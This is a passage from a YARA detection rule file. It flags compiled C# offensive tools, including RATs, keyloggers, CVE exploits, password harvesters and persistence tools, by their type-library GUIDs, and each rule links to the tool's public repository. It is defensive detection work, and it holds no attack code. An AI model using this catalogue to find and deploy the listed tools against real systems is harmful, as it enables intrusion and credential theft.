  $typelibguid2 = \"256607c2-4126-4272-a2fa-a1ffc0a734f0\" ascii nocase wide\n        $typelibguid3 = \"4e6ceea1-f266-401c-b832-f91432d46f42\" ascii nocase wide\n        $typelibguid4 = \"1e6e9b03-dd5f-4047-b386-af7a7904f884\" ascii nocase wide\n        $typelibguid5 = \"d85e3601-0421-4efa-a479-f3370c0498fd\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AMSI_Handler {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/two06/AMSI_Handler\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d829426c-986c-40a4-8ee2-58d14e090ef2\" ascii nocase wide\n        $typelibguid1 = \"86652418-5605-43fd-98b5-859828b072be\" ascii nocase wide\n        $typelibguid2 = \"1043649f-18e1-41c4-ae8d-ac4d9a86c2fc\" ascii nocase wide\n        $typelibguid3 = \"1d920b03-c537-4659-9a8c-09fb1d615e98\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RAT_TelegramSpyBot {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SebastianEPH/RAT.TelegramSpyBot\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8653fa88-9655-440e-b534-26c3c760a0d3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TheHackToolBoxTeek {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/teeknofil/TheHackToolBoxTeek\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2aa8c254-b3b3-469c-b0c9-dcbe1dd101c0\" ascii nocase wide\n        $typelibguid1 = \"afeff505-14c1-4ecf-b714-abac4fbd48e7\" ascii nocase wide\n        $typelibguid2 = \"4cf42167-a5cf-4b2d-85b4-8e764c08d6b3\" ascii nocase wide\n        $typelibguid3 = \"118a90b7-598a-4cfc-859e-8013c8b9339c\" ascii nocase wide\n        $typelibguid4 = \"3075dd9a-4283-4d38-a25e-9f9845e5adcb\" ascii nocase wide\n        $typelibguid5 = \"295655e8-2348-4700-9ebc-aa57df54887e\" ascii nocase wide\n        $typelibguid6 = \"74efe601-9a93-46c3-932e-b80ab6570e42\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_USBTrojan {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mashed-potatoes/USBTrojan\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4eee900e-adc5-46a7-8d7d-873fd6aea83e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_IIS_backdoor {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/WBGlIl/IIS_backdoor\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3fda4aa9-6fc1-473f-9048-7edc058c4f65\" ascii nocase wide\n        $typelibguid1 = \"73ca4159-5d13-4a27-8965-d50c41ab203c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ShellGen {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jasondrawdy/ShellGen\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c6894882-d29d-4ae1-aeb7-7d0a9b915013\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Mass_RAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Mass-RAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6c43a753-9565-48b2-a372-4210bb1e0d75\" ascii nocase wide\n        $typelibguid1 = \"92ba2a7e-c198-4d43-929e-1cfe54b64d95\" ascii nocase wide\n        $typelibguid2 = \"4cb9bbee-fb92-44fa-a427-b7245befc2f3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Browser_ExternalC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/Browser-ExternalC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"10a730cd-9517-42d5-b3e3-a2383515cca9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_OffensivePowerShellTasking {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/leechristensen/OffensivePowerShellTasking\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d432c332-3b48-4d06-bedb-462e264e6688\" ascii nocase wide\n        $typelibguid1 = \"5796276f-1c7a-4d7b-a089-550a8c19d0e8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DoHC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SpiderLabs/DoHC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9877a948-2142-4094-98de-e0fbb1bc4062\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SyscallPOC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SolomonSklash/SyscallPOC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1e54637b-c887-42a9-af6a-b4bd4e28cda9\" ascii nocase wide\n        $typelibguid1 = \"198d5599-d9fc-4a74-87f4-5077318232ad\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Pen_Test_Tools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/awillard1/Pen-Test-Tools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"922e7fdc-33bf-48de-bc26-a81f85462115\" ascii nocase wide\n        $typelibguid1 = \"ad5205dd-174d-4332-96d9-98b076d6fd82\" ascii nocase wide\n        $typelibguid2 = \"b67e7550-f00e-48b3-ab9b-4332b1254a86\" ascii nocase wide\n        $typelibguid3 = \"5e95120e-b002-4495-90a1-cd3aab2a24dd\" ascii nocase wide\n        $typelibguid4 = \"295017f2-dc31-4a87-863d-0b9956c2b55a\" ascii nocase wide\n        $typelibguid5 = \"abbaa2f7-1452-43a6-b98e-10b2c8c2ba46\" ascii nocase wide\n        $typelibguid6 = \"a4043d4c-167b-4326-8be4-018089650382\" ascii nocase wide\n        $typelibguid7 = \"51abfd75-b179-496e-86db-62ee2a8de90d\" ascii nocase wide\n        $typelibguid8 = \"a06da7f8-f87e-4065-81d8-abc33cb547f8\" ascii nocase wide\n        $typelibguid9 = \"ee510712-0413-49a1-b08b-1f0b0b33d6ef\" ascii nocase wide\n        $typelibguid10 = \"9780da65-7e25-412e-9aa1-f77d828819d6\" ascii nocase wide\n        $typelibguid11 = \"7913fe95-3ad5-41f5-bf7f-e28f080724fe\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_The_Collection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Tlgyt/The-Collection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"579159ff-3a3d-46a7-b069-91204feb21cd\" ascii nocase wide\n        $typelibguid1 = \"5b7dd9be-c8c3-4c4f-a353-fefb89baa7b3\" ascii nocase wide\n        $typelibguid2 = \"43edcb1f-3098-4a23-a7f2-895d927bc661\" ascii nocase wide\n        $typelibguid3 = \"5f19919d-cd51-4e77-973f-875678360a6f\" ascii nocase wide\n        $typelibguid4 = \"17fbc926-e17e-4034-ba1b-fb2eb57f5dd3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Change_Lockscreen {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nccgroup/Change-Lockscreen\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"78642ab3-eaa6-4e9c-a934-e7b0638bc1cc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LOLBITS {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Kudaes/LOLBITS\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"29d09aa4-ea0c-47c2-973c-1d768087d527\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Keylogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BlackVikingPro/Keylogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"7afbc9bf-32d9-460f-8a30-35e30aa15879\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2020_1337 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/neofito/CVE-2020-1337\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d9c2e3c1-e9cc-42b0-a67c-b6e1a4f962cc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpLogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/SharpLogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"36e00152-e073-4da8-aa0c-375b6dd680c4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AsyncRAT_C_Sharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"619b7612-dfea-442a-a927-d997f99c497b\" ascii nocase wide\n        $typelibguid1 = \"424b81be-2fac-419f-b4bc-00ccbe38491f\" ascii nocase wide\n        $typelibguid2 = \"37e20baf-3577-4cd9-bb39-18675854e255\" ascii nocase wide\n        $typelibguid3 = \"dafe686a-461b-402b-bbd7-2a2f4c87c773\" ascii nocase wide\n        $typelibguid4 = \"ee03faa9-c9e8-4766-bd4e-5cd54c7f13d3\" ascii nocase wide\n        $typelibguid5 = \"8bfc8ed2-71cc-49dc-9020-2c8199bc27b6\" ascii nocase wide\n        $typelibguid6 = \"d640c36b-2c66-449b-a145-eb98322a67c8\" ascii nocase wide\n        $typelibguid7 = \"8de42da3-be99-4e7e-a3d2-3f65e7c1abce\" ascii nocase wide\n        $typelibguid8 = \"bee88186-769a-452c-9dd9-d0e0815d92bf\" ascii nocase wide\n        $typelibguid9 = \"9042b543-13d1-42b3-a5b6-5cc9ad55e150\" ascii nocase wide\n        $typelibguid10 = \"6aa4e392-aaaf-4408-b550-85863dd4baaf\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DarkFender {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xyg3n/DarkFender\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"12fdf7ce-4a7c-41b6-9b32-766ddd299beb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\n/* FPs with IronPython\nrule HKTL_NET_GUID_IronKit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nshalabi/IronKit\"\n        author = \"Arnim Rupp\"\n        score = 50\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"68e40495-c34a-4539-b43e-9e4e6f11a9fb\" ascii nocase wide\n        $typelibguid1 = \"641cd52d-3886-4a74-b590-2a05621502a4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n*/\n\nrule HKTL_NET_GUID_MinerDropper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/DylanAlloy/MinerDropper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"46a7af83-1da7-40b2-9d86-6fd6223f6791\" ascii nocase wide\n        $typelibguid1 = \"8433a693-f39d-451b-955b-31c3e7fa6825\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpDomainSpray {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/HunnicCyber/SharpDomainSpray\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"76ffa92b-429b-4865-970d-4e7678ac34ea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_iSpyKeylogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mwsrc/iSpyKeylogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"ccc0a386-c4ce-42ef-aaea-b2af7eff4ad8\" ascii nocase wide\n        $typelibguid1 = \"816b8b90-2975-46d3-aac9-3c45b26437fa\" ascii nocase wide\n        $typelibguid2 = \"279b5533-d3ac-438f-ba89-3fe9de2da263\" ascii nocase wide\n        $typelibguid3 = \"88d3dc02-2853-4bf0-b6dc-ad31f5135d26\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SolarFlare {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mubix/solarflare\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-15\"\n    strings:\n        $typelibguid0 = \"ca60e49e-eee9-409b-8d1a-d19f1d27b7e4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Snaffler {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SnaffCon/Snaffler\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2aa060b4-de88-4d2a-a26a-760c1cefec3e\" ascii nocase wide\n        $typelibguid1 = \"b118802d-2e46-4e41-aac7-9ee890268f8b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpShares {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/SharpShares/\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fe9fdde5-3f38-4f14-8c64-c3328c215cf2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpEDRChecker {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/PwnDexter/SharpEDRChecker\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-18\"\n    strings:\n        $typelibguid0 = \"bdfee233-3fed-42e5-aa64-492eb2ac7047\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpClipHistory {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/SharpClipHistory\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"1126d5b4-efc7-4b33-a594-b963f107fe82\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpGPO_RemoteAccessPolicies {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/SharpGPO-RemoteAccessPolicies\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"fbb1abcf-2b06-47a0-9311-17ba3d0f2a50\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Absinthe {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cameronhotchkies/Absinthe\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"9936ae73-fb4e-4c5e-a5fb-f8aaeb3b9bd6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ExploitRemotingService {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/ExploitRemotingService\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"fd17ae38-2fd3-405f-b85b-e9d14e8e8261\" ascii nocase wide\n        $typelibguid1 = \"1850b9bb-4a23-4d74-96b8-58f274674566\" ascii nocase wide\n        $typelibguid2 = \"297cbca1-efa3-4f2a-8d5f-e1faf02ba587\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Xploit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shargon/Xploit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"4545cfde-9ee5-4f1b-b966-d128af0b9a6e\" ascii nocase wide\n        $typelibguid1 = \"33849d2b-3be8-41e8-a1e2-614c94c4533c\" ascii nocase wide\n        $typelibguid2 = \"c2dc73cc-a959-4965-8499-a9e1720e594b\" ascii nocase wide\n        $typelibguid3 = \"77059fa1-4b7d-4406-bc1a-cb261086f915\" ascii nocase wide\n        $typelibguid4 = \"a4a04c4d-5490-4309-9c90-351e5e5fd6d1\" ascii nocase wide\n        $typelibguid5 = \"ca64f918-3296-4b7d-9ce6-b98389896765\" ascii nocase wide\n        $typelibguid6 = \"10fe32a0-d791-47b2-8530-0b19d91434f7\" ascii nocase wide\n        $typelibguid7 = \"679bba57-3063-4f17-b491-4f0a730d6b02\" ascii nocase wide\n        $typelibguid8 = \"0981e164-5930-4ba0-983c-1cf679e5033f\" ascii nocase wide\n        $typelibguid9 = \"2a844ca2-5d6c-45b5-963b-7dca1140e16f\" ascii nocase wide\n        $typelibguid10 = \"7d75ca11-8745-4382-b3eb-c41416dbc48c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PoC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/thezdi/PoC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"89f9d411-e273-41bb-8711-209fd251ca88\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpGPOAbuse {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/SharpGPOAbuse\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"4f495784-b443-4838-9fa6-9149293af785\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Watson {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/Watson\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"49ad5f38-9e37-4967-9e84-fe19c7434ed7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_StandIn {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/StandIn\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"01c142ba-7af1-48d6-b185-81147a2f7db7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_azure_password_harvesting {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/guardicore/azure_password_harvesting\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"7ad1ff2d-32ac-4c54-b615-9bb164160dac\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PowerOPS {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fdiskyou/PowerOPS\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"2a3c5921-7442-42c3-8cb9-24f21d0b2414\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Random_CSharpTools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/xorrior/Random-CSharpTools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"f7fc19da-67a3-437d-b3b0-2a257f77a00b\" ascii nocase wide\n        $typelibguid1 = \"47e85bb6-9138-4374-8092-0aeb301fe64b\" ascii nocase wide\n        $typelibguid2 = \"c7d854d8-4e3a-43a6-872f-e0710e5943f7\" ascii nocase wide\n        $typelibguid3 = \"d6685430-8d8d-4e2e-b202-de14efa25211\" ascii nocase wide\n        $typelibguid4 = \"1df925fc-9a89-4170-b763-1c735430b7d0\" ascii nocase wide\n        $typelibguid5 = \"817cc61b-8471-4c1e-b5d6-c754fc550a03\" ascii nocase wide\n        $typelibguid6 = \"60116613-c74e-41b9-b80e-35e02f25891e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2020_0668 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/RedCursorSecurityConsulting/CVE-2020-0668\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"1b4c5ec1-2845-40fd-a173-62c450f12ea5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WindowsRpcClients {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/WindowsRpcClients\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"843d8862-42eb-49ee-94e6-bca798dd33ea\" ascii nocase wide\n        $typelibguid1 = \"632e4c3b-3013-46fc-bc6e-22828bf629e3\" ascii nocase wide\n        $typelibguid2 = \"a2091d2f-6f7e-4118-a203-4cea4bea6bfa\" ascii nocase wide\n        $typelibguid3 = \"950ef8ce-ec92-4e02-b122-0d41d83065b8\" ascii nocase wide\n        $typelibguid4 = \"d51301bc-31aa-4475-8944-882ecf80e10d\" ascii nocase wide\n        $typelibguid5 = \"823ff111-4de2-4637-af01-4bdc3ca4cf15\" ascii nocase wide\n        $typelibguid6 = \"5d28f15e-3bb8-4088-abe0-b517b31d4595\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpFruit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpFruit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"3da2f6de-75be-4c9d-8070-08da45e79761\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpWitness {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/SharpWitness\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"b9f6ec34-4ccc-4247-bcef-c1daab9b4469\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RexCrypter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/syrex1013/RexCrypter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"10cd7c1c-e56d-4b1b-80dc-e4c496c5fec5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharPersist {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fireeye/SharPersist\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"9d1b853e-58f1-4ba5-aefc-5c221ca30e48\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2019_1253 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/padovah4ck/CVE-2019-1253\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"584964c1-f983-498d-8370-23e27fdd0399\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_scout {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jaredhaight/scout\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"d9c76e82-b848-47d4-8f22-99bf22a8ee11\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Grouper2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/l0ss/Grouper2/\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = 